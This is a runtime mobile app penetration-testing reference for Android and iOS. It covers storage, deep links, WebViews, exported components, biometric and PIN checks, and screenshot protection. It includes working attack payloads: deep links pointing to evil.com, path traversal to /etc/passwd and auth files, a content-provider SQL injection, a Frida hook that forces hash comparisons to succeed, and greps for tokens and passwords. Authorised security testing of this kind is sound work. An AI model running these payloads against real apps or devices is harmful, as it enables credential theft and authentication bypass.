# Runtime Testing Reference

## Data Storage Analysis

### Android SharedPreferences

```bash
# List all SharedPreferences files
adb shell "run-as <package> ls /data/data/<package>/shared_prefs/"

# Read all SharedPreferences
adb shell "run-as <package> cat /data/data/<package>/shared_prefs/*.xml"

# With root (if run-as fails):
adb shell "su -c 'cat /data/data/<package>/shared_prefs/*.xml'"

# Search for sensitive data
adb shell "run-as <package> cat /data/data/<package>/shared_prefs/*.xml" | grep -i "token\|session\|auth\|jwt\|password\|key\|secret\|pin\|otp"

# Monitor SharedPreferences changes in real-time (Frida)
# See frida-scripts.md for SharedPreferences monitor hook
```

**Finding criteria:**
- Tokens/sessions in plaintext XML = HIGH
- User PII (email, phone, name) in plaintext = MEDIUM
- Non-sensitive preferences = acceptable

### Android SQLite Databases

```bash
# List databases
adb shell "run-as <package> ls /data/data/<package>/databases/"

# Pull database for analysis
adb shell "su -c 'cp /data/data/<package>/databases/app.db /sdcard/'"
adb pull /sdcard/app.db

# Analyze
sqlite3 app.db ".tables"
sqlite3 app.db ".schema"
sqlite3 app.db "SELECT * FROM users;"
sqlite3 app.db "SELECT * FROM sessions;"
sqlite3 app.db "SELECT * FROM tokens;"

# Search all tables for sensitive data
sqlite3 app.db ".tables" | tr ' ' '\n' | while read table; do
  echo "=== $table ==="
  sqlite3 app.db "SELECT * FROM $table LIMIT 5;"
done

# Check for SQLCipher (encrypted database)
# If you get "file is not a database" error, it's likely encrypted
# Look for SQLCipher in decompiled source:
# grep -rn "SQLCipher\|net.sqlcipher\|getWritableDatabase" jadx_out/
```

### Android Keystore Assessment

```bash
# Check if app uses Android Keystore (in decompiled source)
grep -rn "AndroidKeyStore\|KeyStore.getInstance\|KeyGenerator\|KeyPairGenerator" --include="*.java" jadx_out/

# Check key properties
grep -rn "setUserAuthenticationRequired\|setKeyValidityDuration\|setInvalidatedByBiometricEnrollment" --include="*.java" jadx_out/

# Frida: List keystore entries
```

```javascript
// keystore_dump.js - List Android Keystore entries
Java.perform(function() {
    var KeyStore = Java.use('java.security.KeyStore');
    var ks = KeyStore.getInstance('AndroidKeyStore');
    ks.load(null);
    var aliases = ks.aliases();
    console.log('[Keystore] Entries:');
    while (aliases.hasMoreElements()) {
        var alias = aliases.nextElement();
        var entry = ks.getEntry(alias, null);
        console.log('  ' + alias + ' -> ' + entry.getClass().getName());
    }
});
```

### iOS Keychain

```bash
# Using objection
objection -g <bundle_id> explore
ios keychain dump
ios keychain dump --json

# Check access control flags
# kSecAttrAccessibleAlways = INSECURE (accessible even when locked)
# kSecAttrAccessibleAfterFirstUnlock = acceptable for background
# kSecAttrAccessibleWhenUnlocked = good
# kSecAttrAccessibleWhenPasscodeSetThisDeviceOnly = best
```

**Finding criteria:**
- Tokens with `kSecAttrAccessibleAlways` = HIGH
- Tokens with `kSecAttrAccessibleAfterFirstUnlock` without biometric = MEDIUM
- Properly protected with biometric + device-only = acceptable

### iOS NSUserDefaults

```bash
# Using objection
objection -g <bundle_id> explore
ios nsuserdefaults get

# Or via SSH on jailbroken device
find /var/mobile/Containers/Data/Application/<UUID>/Library/Preferences/ -name "*.plist"
plutil -p <plist_file> | grep -i "token\|key\|password\|session"
```

### iOS SQLite/CoreData

```bash
# Find databases
find /var/mobile/Containers/Data/Application/<UUID>/ -name "*.sqlite" -o -name "*.db"

# Pull and analyze
scp root@<device>:<path_to_db> ./
sqlite3 app.sqlite ".tables"
sqlite3 app.sqlite "SELECT * FROM ZUSER;"  # CoreData prefixes with Z
```

### Clipboard Monitoring

```javascript
// clipboard_monitor.js - Android
Java.perform(function() {
    var ClipboardManager = Java.use('android.content.ClipboardManager');
    ClipboardManager.setPrimaryClip.implementation = function(clip) {
        var item = clip.getItemAt(0);
        var text = item.getText();
        console.log('[Clipboard] SET: ' + text);
        this.setPrimaryClip(clip);
    };
    ClipboardManager.getPrimaryClip.implementation = function() {
        var clip = this.getPrimaryClip();
        if (clip && clip.getItemCount() > 0) {
            console.log('[Clipboard] GET: ' + clip.getItemAt(0).getText());
        }
        return clip;
    };
});
```

```javascript
// clipboard_monitor_ios.js
if (ObjC.available) {
    var UIPasteboard = ObjC.classes.UIPasteboard;
    Interceptor.attach(UIPasteboard['- setString:'].implementation, {
        onEnter: function(args) {
            console.log('[Clipboard] SET: ' + ObjC.Object(args[2]).toString());
        }
    });
    Interceptor.attach(UIPasteboard['- string'].implementation, {
        onLeave: function(retval) {
            if (retval && !retval.isNull()) {
                console.log('[Clipboard] GET: ' + ObjC.Object(retval).toString());
            }
        }
    });
}
```

### Log Analysis

```bash
# Android: monitor app logs for sensitive data
adb logcat --pid=$(adb shell pidof <package>) | grep -iE "token|password|key|secret|session|auth|jwt|pin|otp|credit|card|account"

# Clear and fresh capture
adb logcat -c
# Perform sensitive operations in app
adb logcat -d --pid=$(adb shell pidof <package>) > app_logs.txt
grep -iE "token|password|key|secret|session|auth" app_logs.txt

# iOS: device console
idevicesyslog | grep -i "<bundle_id>" | grep -iE "token|password|key|secret"
```

---

## Deep Link / URL Scheme Testing

### Android Deep Links

```bash
# Extract from manifest
grep -A10 "android.intent.action.VIEW" apktool_out/AndroidManifest.xml
grep -i "scheme\|host\|pathPrefix\|pathPattern" apktool_out/AndroidManifest.xml

# Test basic deep links
adb shell am start -a android.intent.action.VIEW -d "scheme://host/path"

# Injection payloads
PAYLOADS=(
    "targetapp://auth/callback?token=STOLEN&redirect=http://evil.com"
    "targetapp://webview?url=http://evil.com"
    "targetapp://webview?url=javascript://alert(1)"
    "targetapp://transfer?amount=99999&to=attacker"
    "targetapp://deeplink?next=file:///data/data/<package>/shared_prefs/auth.xml"
    "targetapp://open?url=content://<package>.provider/../../etc/passwd"
)

for payload in "${PAYLOADS[@]}"; do
    echo "Testing: $payload"
    adb shell am start -a android.intent.action.VIEW -d "$payload"
    sleep 2
done

# Test with extras
adb shell am start -a android.intent.action.VIEW \
    -d "targetapp://action" \
    --es "extra_key" "injected_value" \
    --ei "amount" 99999 \
    --ez "is_admin" true
```

### iOS URL Schemes

```bash
# Extract from Info.plist
plutil -p ipa_out/Payload/*.app/Info.plist | grep -A10 "CFBundleURLSchemes"

# Test via Frida
frida -U -f <bundle_id> --eval '
ObjC.classes.UIApplication.sharedApplication().openURL_(
    ObjC.classes.NSURL.URLWithString_("targetapp://auth?token=INJECTED")
)'

# Universal Links (HTTPS deep links)
# Check apple-app-site-association
curl https://<domain>/.well-known/apple-app-site-association
```

### What to Look For

- **Open redirect:** deep link loads arbitrary URL in WebView
- **Token injection:** callback URL accepts attacker-controlled tokens
- **XSS via WebView:** JavaScript execution through deep link parameters
- **File access:** deep link triggers file:// or content:// loading
- **Auth bypass:** deep link skips authentication steps
- **Parameter tampering:** business logic values (amount, recipient) in deep link

---

## WebView Security Testing

### Identify Vulnerable WebViews

```bash
# In decompiled source
grep -rn "setJavaScriptEnabled(true)" --include="*.java" jadx_out/
grep -rn "addJavascriptInterface" --include="*.java" jadx_out/
grep -rn "setAllowFileAccess\|setAllowFileAccessFromFileURLs\|setAllowUniversalAccessFromFileURLs" --include="*.java" jadx_out/
grep -rn "loadUrl\|loadData\|evaluateJavascript" --include="*.java" jadx_out/
```

### WebView Attack Scenarios

```javascript
// webview_hooks.js - Monitor and exploit WebView
Java.perform(function() {
    var WebView = Java.use('android.webkit.WebView');

    // Log all URLs loaded
    WebView.loadUrl.overload('java.lang.String').implementation = function(url) {
        console.log('[WebView] loadUrl: ' + url);
        this.loadUrl(url);
    };

    // Log JavaScript interface registrations
    WebView.addJavascriptInterface.implementation = function(obj, name) {
        console.log('[WebView] JS Interface added: ' + name);
        console.log('  Class: ' + obj.getClass().getName());
        // List @JavascriptInterface methods
        var methods = obj.getClass().getMethods();
        for (var i = 0; i < methods.length; i++) {
            if (methods[i].isAnnotationPresent(Java.use('android.webkit.JavascriptInterface').class)) {
                console.log('  @JavascriptInterface: ' + methods[i].getName() + '(' + methods[i].getParameterTypes().join(', ') + ')');
            }
        }
        this.addJavascriptInterface(obj, name);
    };

    // Monitor evaluateJavascript
    WebView.evaluateJavascript.implementation = function(script, callback) {
        console.log('[WebView] evaluateJavascript: ' + script.substring(0, 200));
        this.evaluateJavascript(script, callback);
    };

    // Check settings
    var WebSettings = Java.use('android.webkit.WebSettings');
    WebSettings.setAllowFileAccessFromFileURLs.implementation = function(allow) {
        console.log('[WebView] setAllowFileAccessFromFileURLs: ' + allow);
        this.setAllowFileAccessFromFileURLs(allow);
    };
    WebSettings.setAllowUniversalAccessFromFileURLs.implementation = function(allow) {
        console.log('[WebView] setAllowUniversalAccessFromFileURLs: ' + allow);
        this.setAllowUniversalAccessFromFileURLs(allow);
    };
});
```

### Exploitation

If `addJavascriptInterface` is exposed:
```javascript
// From injected page or XSS context:
// window.<interfaceName>.<methodName>(args)
// Example: window.AppBridge.getToken()
// Example: window.NativeHelper.executeCommand("id")
```

If `setAllowFileAccessFromFileURLs(true)`:
```javascript
// XHR to read local files from file:// context
var xhr = new XMLHttpRequest();
xhr.open('GET', 'file:///data/data/<package>/shared_prefs/auth.xml', false);
xhr.send();
// xhr.responseText contains the file
```

---

## Intent/IPC Injection (Android)

### Exported Component Testing

```bash
# List all exported components
adb shell dumpsys package <package> | grep -A5 "exported=true"

# Start exported activities
adb shell am start -n <package>/.ExportedActivity
adb shell am start -n <package>/.ExportedActivity --es "url" "http://evil.com"
adb shell am start -n <package>/.InternalActivity  # test non-exported too (may work on older Android)

# Send broadcasts
adb shell am broadcast -a <package>.ACTION_NAME --es "data" "injected"
adb shell am broadcast -a <package>.PUSH_RECEIVED --es "message" "fake_notification"

# Start services
adb shell am startservice -n <package>/.ExportedService --es "cmd" "dump"

# Query content providers
adb shell content query --uri content://<package>.provider/users
adb shell content query --uri content://<package>.provider/users --where "_id=1"

# Path traversal on content providers
adb shell content read --uri "content://<package>.provider/files/../../shared_prefs/auth.xml"

# SQL injection on content providers
adb shell content query --uri "content://<package>.provider/users" --where "1=1) UNION SELECT sql FROM sqlite_master--"
```

### Drozer (Comprehensive)

```bash
drozer console connect
run app.package.attacksurface <package>
run app.activity.info -a <package>
run app.service.info -a <package>
run app.broadcast.info -a <package>
run app.provider.info -a <package>

# Test activities
run app.activity.start --component <package> <package>.ExportedActivity

# Test providers
run scanner.provider.injection -a <package>
run scanner.provider.traversal -a <package>
run app.provider.query content://<package>.provider/

# Test services
run app.service.send <package> <package>.ExportedService --msg 1 2 3
```

---

## Biometric/PIN Authentication Testing

### Check if Auth is Client-side Only

```javascript
// biometric_analysis.js - Determine if biometric is client-only or server-validated
Java.perform(function() {
    // Hook BiometricPrompt callback
    var AuthCallback = Java.use('androidx.biometric.BiometricPrompt$AuthenticationCallback');
    AuthCallback.onAuthenticationSucceeded.implementation = function(result) {
        console.log('[Biometric] onAuthenticationSucceeded called');
        console.log('  CryptoObject: ' + result.getCryptoObject());
        // If CryptoObject is null → likely client-side only (VULNERABLE)
        // If CryptoObject has a Cipher/Signature → server validates crypto result
        if (result.getCryptoObject() === null) {
            console.log('  [!] No CryptoObject — likely client-side only auth!');
        } else {
            console.log('  [*] CryptoObject present — may be server-validated');
        }
        this.onAuthenticationSucceeded(result);
    };
});
```

**Key question:** After biometric success, does the app:
1. Just set a boolean flag and proceed? → **Client-side only** (bypassable, HIGH finding)
2. Use CryptoObject to decrypt a key/sign a challenge? → **Server-validated** (harder to bypass)

### PIN/Pattern Bypass

```javascript
// pin_bypass.js - Hook PIN verification
Java.perform(function() {
    // Common patterns to hook:
    // 1. String comparison of PIN
    var String = Java.use('java.lang.String');
    String.equals.implementation = function(other) {
        var dominated = this.toString();
        var result = this.equals(other);
        // Log PIN comparisons (usually 4-6 digit strings)
        if (dominated.match(/^\d{4,6}$/) || (other && other.toString().match(/^\d{4,6}$/))) {
            console.log('[PIN] Comparing: "' + dominated + '" == "' + other + '" → ' + result);
        }
        return result;
    };

    // 2. MessageDigest (hashed PIN comparison)
    var MessageDigest = Java.use('java.security.MessageDigest');
    MessageDigest.isEqual.implementation = function(a, b) {
        console.log('[PIN] MessageDigest.isEqual called');
        return true; // bypass hash comparison
    };
});
```

---

## Screenshot/Screen Recording Protection

### Check FLAG_SECURE

```javascript
// screenshot_check.js - Check if sensitive screens are protected
Java.perform(function() {
    var Window = Java.use('android.view.Window');
    Window.setFlags.implementation = function(flags, mask) {
        if (flags & 0x2000) { // FLAG_SECURE = 0x2000
            console.log('[Screen] FLAG_SECURE set on: ' + this.getContext().getClass().getName());
        }
        this.setFlags(flags, mask);
    };

    // To REMOVE FLAG_SECURE (for screenshots during testing):
    var Activity = Java.use('android.app.Activity');
    Activity.onResume.implementation = function() {
        this.onResume();
        this.getWindow().clearFlags(0x2000);
        console.log('[Screen] FLAG_SECURE cleared for: ' + this.getClass().getName());
    };
});
```

### Test Scenarios

```bash
# Try to take screenshot on sensitive screens (login, transaction, OTP)
adb shell screencap /sdcard/screenshot.png
adb pull /sdcard/screenshot.png

# If screenshot is blank/black → FLAG_SECURE is set (good)
# If screenshot shows content → FLAG_SECURE missing (MEDIUM finding)

# Screen recording test
adb shell screenrecord /sdcard/recording.mp4
# Navigate through sensitive screens
# Ctrl+C to stop
adb pull /sdcard/recording.mp4
```

---

## Output Checklist (Phase 5)

Save to `phase5-runtime/`:

1. `data-storage-findings.md` — what's stored where, encryption status
2. `deeplink-results.md` — tested URLs, responses, vulnerabilities
3. `webview-analysis.md` — JS interfaces, file access, exploitability
4. `ipc-testing.md` — exported components, injection results
5. `auth-bypass.md` — biometric/PIN analysis, client vs server validation
6. `screenshots/` — evidence of each finding
7. `frida-output/` — console logs from hooks
